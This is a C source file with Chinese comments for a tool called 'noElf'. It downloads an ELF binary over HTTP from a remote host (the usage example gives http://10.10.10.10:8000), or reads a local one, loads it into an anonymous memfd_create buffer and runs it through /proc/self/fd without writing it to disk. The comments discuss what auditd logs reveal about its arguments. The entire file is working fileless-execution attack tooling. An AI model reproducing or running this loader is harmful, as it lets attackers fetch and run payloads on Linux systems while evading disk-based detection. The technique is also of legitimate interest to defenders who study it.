/*
 * Author: seventeen
 * 这种方法没有通过调试fork后的子进程去执行，所以会暴露参数。但执行参数可以超过7个字符不会出现问题。
 * 使用auditd监控会得到类似type=EXECVE msg=audit(1566354435.549:153): argc=2 a0="/proc/self/fd/6" a1="-a"内容
 * ateam ptrace项目demo参数不能超过7个字符因为通过fork子进程，修改栈中要执行的参数，受到了寄存器的限制(并且该方法在内核5.x无法使用)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

#define HOST_NAME_LEN   256
#define URI_MAX_LEN     2048
#define RECV_BUF        8192
#define RCV_SND_TIMEOUT (10*1000)   //网络超时时间

int fdm, filesize;
void *elfbuf;

typedef struct {
    int sock;                       //与服务器通信的socket
    FILE *in;                       //sock描述符转为文件指针，方便读写
    char host_name[HOST_NAME_LEN];  //主机名
    int port;                       //主机端口号
    char uri[URI_MAX_LEN];          //资源路径
    char buffer[RECV_BUF];          //读写缓冲
    int status_code;                //http状态码
    int chunked_flag;               //chunked传输的标志位
    int len;                        //Content-length里的长度
    char location[URI_MAX_LEN];     //重定向地址
    int recv_data_len;              //收到数据的总长度
} http_t;

/* 打印宏 */
#define MSG_DEBUG   0x01
#define MSG_INFO    0x02
#define MSG_ERROR   0x04

static int print_level = /*MSG_DEBUG |*/ MSG_INFO | MSG_ERROR;

#define lprintf(level, format, argv...) do{     \
    if(level & print_level)     \
        printf("[%s][%s(%d)]:"format, #level, __FUNCTION__, __LINE__, ##argv);  \
}while(0)

#define MIN(x, y) ((x) > (y) ? (y) : (x))

#define HTTP_OK         200
#define HTTP_REDIRECT   302
#define HTTP_NOT_FOUND  404

/* 不区分大小写的strstr */
char *strncasestr(char *str, char *sub) {
    if (!str || !sub)
        return NULL;

    int len = strlen(sub);
    if (len == 0) {
        return NULL;
    }

    while (*str) {
        if (strncasecmp(str, sub, len) == 0) {
            return str;
        }
        ++str;
    }
    return NULL;
}

/* 判断是否为url */
int isBeginWithHttp(const char *str1) {
    char *str2 = "http";
    if (str1 == NULL || str2 == NULL)
        return -1;
    int len1 = strlen(str1);
    int len2 = strlen(str2);
//    printf("%d\n", len1);
//    printf("%d\n", len2);
    if ((len1 < len2) || (len1 == 0 || len2 == 0))
        return -1;
    char *p = str2;
    int i = 0;
    while (*p != '\0') {
        if (*p != str1[i])
            return 0;
        p++;
        i++;
    }
    return 1;
}

/* 解析URL, 成功返回0，失败返回-1 */
int parserUrl(char *url, http_t *info) {
    char *tmp = url, *start = NULL, *end = NULL;
    int len = 0;

    /* 跳过http:// */
    if (strncasestr(tmp, "http://")) {
        tmp += strlen("http://");
    }
    start = tmp;
    if (!(tmp = strchr(start, '/'))) {
        lprintf(MSG_ERROR, "url invaild\n");
        return -1;
    }
    end = tmp;

    /*解析端口号和主机*/
    info->port = 80;   //默认值80

    len = MIN(end - start, HOST_NAME_LEN - 1);
    strncpy(info->host_name, start, len);
    info->host_name[len] = '\0';

    if ((tmp = strchr(start, ':')) && tmp < end) {
        info->port = atoi(tmp + 1);
        if (info->port <= 0 || info->port >= 65535) {
            lprintf(MSG_ERROR, "url port invaild\n");
            return -1;
        }
        /* 覆盖之前的赋值 */
        len = MIN(tmp - start, HOST_NAME_LEN - 1);
        strncpy(info->host_name, start, len);
        info->host_name[len] = '\0';
    }

    /* 复制uri */
    start = end;
    strncpy(info->uri, start, URI_MAX_LEN - 1);

    printf("[*] host:%s port:%d uri:%s\n",
           info->host_name, info->port, info->uri);
    return 0;
}

/* dns解析,返回解析到的第一个地址，失败返回-1，成功则返回相应地址 */
unsigned long parserDNS(char *host_name) {
    struct hostent *host;
    struct in_addr addr;
    char **pp;

    host = gethostbyname(host_name);
    if (host == NULL) {
        lprintf(MSG_ERROR, "gethostbyname %s failed\n", host_name);
        return -1;
    }

    pp = host->h_addr_list;

    if (*pp != NULL) {
        addr.s_addr = *((unsigned int *) *pp);
        //lprintf(MSG_INFO, "%s address is %s\n", host_name, inet_ntoa(addr));
        pp++;
        return addr.s_addr;
    }

    return -1;
}

/* 设置发送接收超时 */
int setSocketOption(int sock) {
    struct timeval timeout;

    timeout.tv_sec = RCV_SND_TIMEOUT / 1000;
    timeout.tv_usec = RCV_SND_TIMEOUT % 1000 * 1000;
    lprintf(MSG_DEBUG, "%ds %dus\n", (int) timeout.tv_sec, (int) timeout.tv_usec);
    //设置socket为非阻塞
    // fcntl(sock ,F_SETFL, O_NONBLOCK); //以非阻塞的方式，connect需要重新处理

    // 设置发送超时
    if (-1 == setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *) &timeout,
                         sizeof(struct timeval))) {
        lprintf(MSG_ERROR, "setsockopt error: %m\n");
        return -1;
    }

    // 设置接送超时
    if (-1 == setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *) &timeout,
                         sizeof(struct timeval))) {
        lprintf(MSG_ERROR, "setsockopt error: %m\n");
        return -1;
    }

    return 0;
}

/* 连接到服务器 */
int connectServer(http_t *info) {
    int sockfd;
    struct sockaddr_in server;
    unsigned long addr = 0;
    unsigned short port = info->port;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (-1 == sockfd) {
        lprintf(MSG_ERROR, "socket create failed\n");
        goto failed;
    }

    if (-1 == setSocketOption(sockfd)) {
        goto failed;
    }

    if ((addr = parserDNS(info->host_name)) == -1) {
        lprintf(MSG_ERROR, "Get Dns Failed\n");
        goto failed;
    }
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = addr;

    if (-1 == connect(sockfd, (struct sockaddr *) &server, sizeof(struct sockaddr))) {
        lprintf(MSG_ERROR, "connect failed: %m\n");
        goto failed;
    }

    info->sock = sockfd;
    return 0;

    failed:
    if (sockfd != -1)
        close(sockfd);
    return -1;
}

/* 发送http请求 */
int sendRequest(http_t *info) {
    int len;

    memset(info->buffer, 0x0, RECV_BUF);
    snprintf(info->buffer, RECV_BUF - 1, "GET %s HTTP/1.1\r\n"
                                         "Accept: */*\r\n"
                                         "User-Agent: noELF\r\n"
                                         "Host: %s\r\n"
                                         "Connection: Close\r\n\r\n", info->uri, info->host_name);

    //lprintf(MSG_DEBUG, "request:\n%s\n", info->buffer);
    return send(info->sock, info->buffer, strlen(info->buffer), 0);
}

/* 解析http头 */
int parseHttpHeader(http_t *info) {
    char *p = NULL;

    // 解析第一行
    fgets(info->buffer, RECV_BUF, info->in);
    p = strchr(info->buffer, ' ');

    info->status_code = atoi(p + 1);
    //lprintf(MSG_DEBUG, "http status code: %d\n", info->status_code);

    // 循环读取解析http头
    while (fgets(info->buffer, RECV_BUF, info->in)) {
        // 判断头部是否读完
        if (!strcmp(info->buffer, "\r\n")) {
            return 0;   /* 头解析正常 */
        }
        //lprintf(MSG_DEBUG, "%s", info->buffer);
        // 解析长度 Content-length: 554
        if (p = strncasestr(info->buffer, "Content-length")) {
            p = strchr(p, ':');
            p += 2;     // 跳过冒号和后面的空格
            info->len = atoi(p);
            //lprintf(MSG_INFO, "Content-length: %d\n", info->len);
        } else if (p = strncasestr(info->buffer, "Transfer-Encoding")) {
            if (strncasestr(info->buffer, "chunked")) {
                info->chunked_flag = 1;
            } else {
                /* 不支持其他编码的传送方式 */
                lprintf(MSG_ERROR, "Not support %s", info->buffer);
                return -1;
            }
            lprintf(MSG_INFO, "%s", info->buffer);
        } else if (p = strncasestr(info->buffer, "Location")) {
            p = strchr(p, ':');
            p += 2;     // 跳过冒号和后面的空格
            strncpy(info->location, p, URI_MAX_LEN - 1);
            lprintf(MSG_INFO, "Location: %s\n", info->location);
        }
    }
    lprintf(MSG_ERROR, "bad http head\n");
    return -1;  /* 头解析出错 */
}

/* 保存服务器响应的内容 */
int saveData(http_t *info, const char *buf, int len) {

//    printf("%s\n", buf);
//    int write_len = 0;
//    write_len = write(fdm, buf, filesize);
//    return write_len;

    printf("[+] WRITE TO ANONYMOUS: %d\n", len);
    write(fdm, buf, len);

    return 1;
}

/* 读数据 */
int readData(http_t *info, int len) {
    int total_len = len;
    int read_len = 0;
    int rtn_len = 0;

    while (total_len) {
        read_len = MIN(total_len, RECV_BUF);
        // lprintf(MSG_DEBUG, "need read len: %d\n", read_len);
        rtn_len = fread(info->buffer, sizeof(char), read_len, info->in);
        if (rtn_len < read_len) {
            if (ferror(info->in)) {
                if (errno == EINTR) /* 信号中断了读操作 */
                { ;   /* 不做处理继续往下走 */
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) /* 超时 */
                {
                    lprintf(MSG_ERROR, "socket recvice timeout: %dms\n", RCV_SND_TIMEOUT);
                    total_len -= rtn_len;
                    //lprintf(MSG_DEBUG, "read len: %d\n", rtn_len);
                    break;
                } else    /* 其他错误 */
                {
                    lprintf(MSG_ERROR, "fread error: %m\n");
                    break;
                }
            } else    /* 读到文件尾 */
            {
                lprintf(MSG_ERROR, "socket closed by peer\n");
                total_len -= rtn_len;
                //lprintf(MSG_DEBUG, "read len: %d\n", rtn_len);
                break;
            }
        }

        // lprintf(MSG_DEBUG, " %s\n", info->buffer);
        total_len -= rtn_len;
        //lprintf(MSG_DEBUG, "read len: %d\n", rtn_len);
        if (-1 == saveData(info, info->buffer, rtn_len)) {
            return -1;
        }
        info->recv_data_len += rtn_len;
    }
    if (total_len != 0) {
        lprintf(MSG_ERROR, "we need to read %d bytes, but read %d bytes now\n",
                len, len - total_len);
        return -1;
    }
}


/* 接收服务器的响应数据 */
int recvResponse(http_t *info) {
    int len = 0, total_len = info->len;

    filesize = total_len;
//    elfbuf = malloc(filesize);
    fdm = syscall(__NR_memfd_create, "elf", MFD_CLOEXEC);
    ftruncate(fdm, filesize);

    if (-1 == readData(info, total_len))
        return -1;

    return 0;
}

/* 清理操作 */
void cleanUp(http_t *info) {
    if (info->in)
        fclose(info->in);
    if (-1 != info->sock)
        close(info->sock);
    if (info)
        free(info);
}


/* 下载主函数 */
int downloadControl(char *url) {
    http_t *info = NULL;
    char tmp[URI_MAX_LEN] = {0};

    if (!url)
        return -1;

    //初始化结构体
    info = malloc(sizeof(http_t));
    if (!info) {
        //lprintf(MSG_ERROR, "malloc failed\n");
        return -1;
    }
    memset(info, 0x0, sizeof(http_t));
    info->sock = -1;

    // 解析url
    if (-1 == parserUrl(url, info))
        goto failed;

    // 连接到server
    if (-1 == connectServer(info))
        goto failed;

    // 发送http请求报文
    if (-1 == sendRequest(info))
        goto failed;

    // 接收响应的头信息
    info->in = fdopen(info->sock, "r");
    if (!info->in) {
        //lprintf(MSG_ERROR, "fdopen error\n");
        goto failed;
    }

    // 解析头部
    if (-1 == parseHttpHeader(info))
        goto failed;

    switch (info->status_code) {
        case HTTP_OK:
            // 接收数据
            //lprintf(MSG_DEBUG, "recv data now\n");
            if (-1 == recvResponse(info))
                goto failed;

            printf("[+] recv %d bytes\n", info->recv_data_len);

            break;
        case HTTP_REDIRECT:
            // 重启本函数
            lprintf(MSG_INFO, "redirect: %s\n", info->location);
            strncpy(tmp, info->location, URI_MAX_LEN - 1);
            cleanUp(info);
            return downloadControl(tmp);

        case HTTP_NOT_FOUND:
            // 退出
            lprintf(MSG_ERROR, "Page not found\n");
            goto failed;
            break;

        default:
            lprintf(MSG_INFO, "Not supported http code %d\n", info->status_code);
            goto failed;
    }

    cleanUp(info);
    return 0;
    failed:
    cleanUp(info);
    return -1;
}


int memExec(const char *path, char *cLine[]) {

    char cmdline[256];

    if (isBeginWithHttp(path)) {
        printf("[*] LOAD URL: %s\n", path);
//        fd = open("6.txt", O_RDWR + O_CREAT + O_APPEND);
        downloadControl((char *) path);
//        close(fd);
    } else {
        printf("[*] LOAD PATH: %s\n", path);
        int fd;
        fd = open(path, O_RDONLY);
        filesize = lseek(fd, SEEK_SET, SEEK_END);
        lseek(fd, SEEK_SET, SEEK_SET);
        elfbuf = malloc(filesize);
        read(fd, elfbuf, filesize);
        close(fd);
        fdm = syscall(__NR_memfd_create, "elf", MFD_CLOEXEC);
        ftruncate(fdm, filesize);
        write(fdm, elfbuf, filesize);
        free(elfbuf);
    }

    printf("[+] FILESIZE: %d\n", filesize);
    sprintf(cmdline, "/proc/self/fd/%d", fdm);
    cLine[0] = cmdline;
    execve(cLine[0], cLine, NULL);
    return -1;
}

/*
 * usage: ./noElf /bin/ls -al
 * ./noElf http://10.10.10.10:8000/ls -al
 */
int main(int argc, char *argv[]) {

    if (argc == 1) exit(0);

    char *cLine[argc];
    for (int i = 1; i < argc; ++i) {
        cLine[i - 1] = argv[i];
    }

    cLine[argc - 1] = NULL;
    int result = memExec(argv[1], cLine);

    return result;

}



